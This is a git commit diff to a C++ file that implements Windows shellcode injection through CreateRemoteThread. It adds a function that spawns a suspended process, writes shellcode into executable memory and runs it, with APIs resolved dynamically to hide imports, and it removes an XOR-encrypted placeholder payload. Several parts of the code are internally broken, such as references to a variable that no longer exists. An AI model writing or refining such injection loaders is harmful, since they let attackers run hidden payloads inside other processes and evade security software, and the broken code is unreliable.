3475dc442ebe883ea31be327eaed8afe657bddfe
Lin <candyb0x@163.com>
2025-07-06 00:43:32 +0800

    update CreateRemoteThread

--- CreateRemoteThread/CreateRemoteThread.cpp
+++ CreateRemoteThread/CreateRemoteThread.cpp
@@ -1,6 +1,8 @@
 ﻿#include <iostream>
 #include "safeApi.h"
 #include "safeToolhelp.h"
+#include <windows.h>
+#include "payload.h"
 
 DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
 {
@@ -16,20 +18,65 @@ DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
     return 0;
 }
 
-// 示例：简单异或加密后的shellcode（请替换为你自己的shellcode并加密）
-unsigned char encrypted_shellcode[] = { 0x90 ^ 0xAA, 0x90 ^ 0xAA, 0xC3 ^ 0xAA }; // NOP, NOP, RET
-size_t shellcode_len = sizeof(encrypted_shellcode);
 
-void decrypt_shellcode(unsigned char* dst, const unsigned char* src, size_t len, unsigned char key) {
-    for (size_t i = 0; i < len; ++i) {
-        dst[i] = src[i] ^ key;
+
+bool InjectShellcodeToNewSuspendedProcess(const wchar_t* exePath, const unsigned char* encrypted_shellcode, size_t shellcode_len, unsigned char key) {
+    // 挂起创建进程并远程线程注入
+    typedef BOOL(WINAPI* PFN_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+    typedef LPVOID(WINAPI* PFN_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+    typedef BOOL(WINAPI* PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+    typedef HANDLE(WINAPI* PFN_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+    typedef DWORD(WINAPI* PFN_ResumeThread)(HANDLE);
+    typedef BOOL(WINAPI* PFN_TerminateProcess)(HANDLE, UINT);
+    typedef BOOL(WINAPI* PFN_CloseHandle)(HANDLE);
+
+    PFN_CreateProcessW pCreateProcessW = (PFN_CreateProcessW)SafeGetProcAddress(L"kernel32.dll", "CreateProcessW");
+    PFN_VirtualAllocEx pVirtualAllocEx = (PFN_VirtualAllocEx)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
+    PFN_WriteProcessMemory pWriteProcessMemory = (PFN_WriteProcessMemory)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
+    PFN_CreateRemoteThread pCreateRemoteThread = (PFN_CreateRemoteThread)SafeGetProcAddress(L"kernel32.dll", "CreateRemoteThread");
+    PFN_ResumeThread pResumeThread = (PFN_ResumeThread)SafeGetProcAddress(L"kernel32.dll", "ResumeThread");
+    PFN_TerminateProcess pTerminateProcess = (PFN_TerminateProcess)SafeGetProcAddress(L"kernel32.dll", "TerminateProcess");
+    PFN_CloseHandle pCloseHandle = (PFN_CloseHandle)SafeGetProcAddress(L"kernel32.dll", "CloseHandle");
+
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    if (!pCreateProcessW(exePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        return false;
     }
+    LPVOID remoteMem = pVirtualAllocEx(pi.hProcess, NULL, shellcode_len+1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteMem) {
+        pTerminateProcess(pi.hProcess, 0);
+        pCloseHandle(pi.hProcess);
+        pCloseHandle(pi.hThread);
+        delete[] shellcode;
+        return false;
+    }
+    SIZE_T written = 0;
+    if (!pWriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcode_len+1, &written) || written != shellcode_len) {
+        pTerminateProcess(pi.hProcess, 0);
+        pCloseHandle(pi.hProcess);
+        pCloseHandle(pi.hThread);
+        delete[] shellcode;
+        return false;
+    }
+    HANDLE hRemoteThread = pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
+    if (!hRemoteThread) {
+        pTerminateProcess(pi.hProcess, 0);
+        pCloseHandle(pi.hProcess);
+        pCloseHandle(pi.hThread);
+        delete[] shellcode;
+        return false;
+    }
+    pResumeThread(pi.hThread);
+    pCloseHandle(hRemoteThread);
+    pCloseHandle(pi.hProcess);
+    pCloseHandle(pi.hThread);
+    delete[] shellcode;
+    return true;
 }
 
 int main()
 {
-    unsigned char shellcode[sizeof(encrypted_shellcode)];
-    decrypt_shellcode(shellcode, encrypted_shellcode, shellcode_len, 0xAA); // 0xAA为加密key
     typedef HANDLE (WINAPI *PFN_OpenProcess)(DWORD, BOOL, DWORD);
     typedef LPVOID (WINAPI *PFN_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
     typedef BOOL (WINAPI *PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
@@ -44,6 +91,6 @@ int main()
     HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, 0, pid);
     LPVOID lpBaseAddress = pVirtualAllocEx(hProcess, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     // 假设shellcode已定义并解密
-    pWriteProcessMemory(hProcess, lpBaseAddress, shellcode, shellcode_len, NULL);
+    pWriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), NULL);
     pCreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0);
 }
